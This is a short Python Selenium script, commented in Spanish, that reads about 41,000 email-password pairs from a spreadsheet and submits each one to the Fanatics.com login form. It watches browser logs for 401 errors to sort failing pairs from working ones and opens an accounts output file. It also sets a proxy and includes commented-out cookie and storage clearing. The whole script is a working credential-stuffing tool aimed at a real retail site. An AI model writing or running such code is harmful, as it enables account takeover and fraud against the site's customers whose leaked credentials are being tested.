from selenium import webdriver  # Importar Selenium Wire
from selenium.webdriver.common.by import By
from openpyxl import load_workbook
import time

proxy= "107.182.231.94:61694"
chrome_options = webdriver.ChromeOptions()
chrome_options.add_experimental_option("debuggerAddress", "localhost:9222")



driver = webdriver.Chrome(options=chrome_options)
driver.get("https://www.fanatics.com/login?nextPathname=/account")
ws = load_workbook("bbdd.xlsx")
wsd = ws["Sheet"]
contador = 80
numerofil = 41305 #NUMERO DE FILAS DE LA BASE DE DATOS

file = open("Cuentas.txt", "a")
while contador<=numerofil:

    convertidor = str(contador)
    A = wsd["A"+ convertidor]
    B = wsd["B"+ convertidor]
    time.sleep(2)
    input_element = driver.find_element(By.ID, "emailInput")  # Cambia "campo_id" por el identificador real
        # Enviar texto al campo de entrada
    input_element.send_keys(str(A.value))
    input_element = driver.find_element(By.ID, "passwordInput")  # Cambia "campo_id" por el identificador real
        # Enviar texto al campo de entrada
    input_element.send_keys(str(B.value))
    driver.execute_script('document.querySelector("#main-content-wrp > div > section > div > section > form > div.login-registration-form-buttons > button").click()')
    # Obtener los mensajes de la consola
    time.sleep(1)
    logs = driver.get_log("browser")
    for log in logs:
        if "401" in log["message"]:
              print("NO FUCIONA", str(contador))
    '''driver.execute_script("window.localStorage.clear();")
    driver.execute_script("window.sessionStorage.clear();")
    driver.delete_all_cookies()'''
    driver.refresh()
    contador = contador +1